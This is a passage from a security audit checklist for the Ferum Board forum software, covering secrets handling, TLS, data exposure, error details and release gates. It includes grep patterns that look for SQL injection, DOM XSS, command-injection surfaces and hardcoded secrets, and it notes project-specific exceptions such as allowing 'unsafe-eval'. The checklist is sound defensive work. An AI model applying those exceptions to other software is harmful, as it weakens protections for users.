- [ ] Email change: new email must be verified before it takes effect — not changed immediately
- [ ] Password reset token: invalidated immediately after first use
- [ ] User cannot react to their own post (if that is a business rule)
- [ ] User cannot follow themselves
- [ ] Bookmark: duplicate bookmark is handled gracefully (upsert or pre-check)
- [ ] Mark best answer: only the OP or a moderator can do this
- [ ] Post edit window: enforced against `created_at`, not `edited_at`
- [ ] Temp ban: `banned_until` must be in the future, not the past
- [ ] Delete category: blocked if threads exist (RESTRICT foreign key)
- [ ] Thread move: target category must exist and differ from the current one

**PASS:** All business rules are enforced at the use case layer and cannot be bypassed via the API.

**FAIL:** User can follow themselves, reuse a reset token, or mark a best answer on another user's thread.

---

## 14. Secrets Management

### 14.1 Insufficiently Protected Credentials

**What it is:**
A secret committed to git, hardcoded in source, or leaked into logs.

**How to check:**

- [ ] `.env` file is in `.gitignore` — never committed
- [ ] `JWT_SECRET`, `SMTP_PASS`, `S3_SECRET_KEY`, `MEILISEARCH_KEY` are loaded only from env vars
- [ ] No hardcoded secrets in source code (grep for `"secret"`, `"password"`, `"api_key"` in Rust files)
- [ ] Webhook `secret` is not logged when created or updated
- [ ] DB password does not appear in logged connection strings (log only host + port + dbname)

**PASS:** Zero hardcoded secrets. `.env` is gitignored. No secrets appear in logs.

**FAIL:** A secret is found in git history, source code, or a log file.

---

### 14.2 Exposed Key

**What it is:**
An API key or secret is returned in a response or accessible via the API.

**How to check:**

- [ ] `GET /api/admin/webhooks` does not return the `secret` field (only `id`, `url`, `events`, `is_active`)
- [ ] `GET /api/admin/config` does not return `smtp_pass` or `s3_secret_key`
- [ ] `GET /api/admin/plugins/:slug` does not expose any internal plugin credentials
- [ ] The JWT secret is not accessible via any endpoint

**PASS:** All endpoints omit or mask secret fields in their responses.

**FAIL:** Webhook secret, SMTP password, or an API key can be retrieved via the API.

---

## 15. Insufficient Transport Layer Protection

### 15.1 Unprotected Transport of Credentials

**What it is:**
Login, password change, or other credentials sent over unencrypted HTTP.

**How to check:**

- [ ] Production: Nginx forces HTTP → HTTPS redirect (verify nginx config)
- [ ] HSTS header: `Strict-Transport-Security: max-age=31536000; includeSubDomains`
- [ ] Login form `action` does not hardcode `http://`
- [ ] Cookie `Secure` flag: set when `APP_URL` starts with `https://`

**PASS:** HTTPS enforced. HSTS present. Secure cookie flag active in production.

**FAIL:** Login can be submitted over HTTP. Cookie missing Secure flag in production.

---

### 15.2 Unprotected Transport of Sensitive Information

**What it is:**
Sensitive data (PII, tokens, private content) transmitted over an unencrypted connection.

**How to check:**

- [ ] SSE stream (`/api/notifications/stream`): accessible only over HTTPS in production
- [ ] File uploads: multipart forms submitted over HTTPS
- [ ] Outbound webhooks: only sent to `https://` URLs (validated when saving a webhook)
- [ ] Internal service connections (DB, Redis, S3): verify TLS is used for cross-host connections

**PASS:** All transport uses TLS. Webhooks reject `http://` URLs.

**FAIL:** Webhooks can be sent to `http://`. SSE accessible over plain HTTP in production.

---

## 16. Information Exposure

### 16.1 Sensitive Data Exposure

**What it is:**
Responses return unnecessary fields: password hashes, ban reasons to guests, internal IDs, other users' emails.

**How to check:**

- [ ] `GET /api/users/:username` (public): does not return `email`, `password_hash`, `failed_login_count`, `ban_reason`
- [ ] Thread list does not include `author.email` or `author.password_hash`
- [ ] `GET /api/users/me` returns email but not `password_hash`
- [ ] `staff_only` categories return `404` to guests — not `403` (do not reveal existence)
- [ ] Ban reason: visible only to admins and the banned user — not on public profiles
- [ ] StoredFile response: does not return `uploaded_by_id` unless required

**PASS:** Public endpoints do not expose email, hashes, or internal metadata. `staff_only` → 404.

**FAIL:** `password_hash` or another user's `email` can be retrieved via the public API.

---

### 16.2 Error Details

**What it is:**
Production error responses reveal stack traces, SQL errors, file paths, or internal state.

**How to check:**

- [ ] Panic handler: returns `500 Internal Server Error` with a generic message — no stack trace
- [ ] Sea-ORM errors: mapped to `AppError::Internal` — SQL string never exposed
- [ ] `AppError::Internal` → `HandlerError` returns only `{ "error": { "code": "internal_error", "message": "..." } }`
- [ ] File not found: `404` with a generic message — file path not revealed
- [ ] Validation errors: return field name + message — no internal struct path
- [ ] `RUST_BACKTRACE=1` is set only in dev — not in the production Dockerfile or compose file

**PASS:** All production error responses are generic and contain no internal detail.

**FAIL:** SQL query, file path, or stack trace appears in any production error response.

---

## Running the Audit

```bash
# 1. Dependency vulnerability scan
cd backend && cargo audit
cd frontend/client-widgets && npm audit

# 2. Search for common risky patterns (run from repo root)

# SQL injection risk
grep -rn "format!.*SELECT\|format!.*INSERT\|format!.*UPDATE\|format!.*DELETE" backend/

# DOM XSS (raw innerHTML)
grep -rn "innerHTML\s*=" frontend/static/js/

# Unsafe Tera filter on user content
grep -rn "| safe" frontend/

# OS command injection surface
grep -rn "Command::new\|std::process::Command" backend/

# Hardcoded secrets
grep -rn 'secret\s*=\s*"' backend/crates/

# External asset origins — must return nothing (assets are vendored; see 7.1)
grep -rnE '(src|href)="(https?:)?//' frontend/ --include=*.html

# Raw email addresses in logs — every such line must go through email_log_key (5.4).
# The second grep is not optional: without it this flags the correctly-masked call.
grep -rnE 'tracing::(warn|info|error|debug)!\([^)]*email\s*=\s*%' backend/crates/ \
  | grep -v email_log_key

# 3. Manual test checklist
# - Submit wrong password 6 times → verify account lockout
# - Call DELETE /api/admin/users/xxx without auth → verify 401
# - Upload a file with correct extension but wrong magic bytes → verify rejection
# - PATCH /api/posts/:id belonging to another user → verify 403
# - Request a staff_only category as a guest → verify 404 not 403
```

---

## Release Gate

All items below must PASS before every release:

| Check                           | Command                                                      |
| ------------------------------- | ------------------------------------------------------------ |
| `cargo audit` clean             | `cd backend && cargo audit`                                  |
| `npm audit` clean               | `cd frontend/client-widgets && npm audit --audit-level=high` |
| No `innerHTML =` with user data | `grep -rn "innerHTML" frontend/static/js/`                   |
| No `\| safe` on user fields     | `grep -rn "\| safe" frontend/`                               |
| No hardcoded secrets            | `grep -rn 'JWT_SECRET\s*=\s*"' backend/`                     |
| Security headers present        | Manual: `curl -I http://localhost:5173/`                     |
| Sensitive columns classified (5.4) | Manual: review data-at-rest classification table         |
| No external asset origins (7.1) | `grep -rnE '(src\|href)="(https?:)?//' frontend/ --include=*.html` |
| No raw email in logs (5.4)      | `grep -rnE 'email\s*=\s*%' backend/crates/ \| grep -v email_log_key` |
| Auth cookie still `SameSite=Lax` (9) | `cargo test -p ferum-web-tests` — the assertion is the CSRF defence |

---

## Maintaining this document

**When this checklist and the codebase disagree, the codebase is right — fix the
checklist.** Three sections had drifted far enough to be actively harmful, and all
three failed the same way: they described a control the project had considered and
deliberately not built, so an auditor following them would report a FAIL against
working code and "fix" it by removing the real protection.

- **§9** required a CSRF token. There has never been one; the defence is
  `SameSite=Lax` plus an `Origin` allowlist.
- **§6.1** required no `'unsafe-eval'`. It is present on purpose, for Alpine.
- **§7.1** required SRI hashes on CDN assets. Every asset is vendored same-origin.

Each now carries a note saying what the old text asked for and why it was wrong,
rather than being quietly deleted — the wrong version is what a reader arrives with
if they have seen this document before, and silently changing a criterion teaches
nobody why.

When you add a section, prefer a criterion that a grep or a test can settle over one
that needs judgement, and put the mechanical form in the Release Gate above. A
criterion nobody can run is how the drift above started.

_This document is maintained for Ferum Board — update it when new features are added or new risky patterns are discovered._
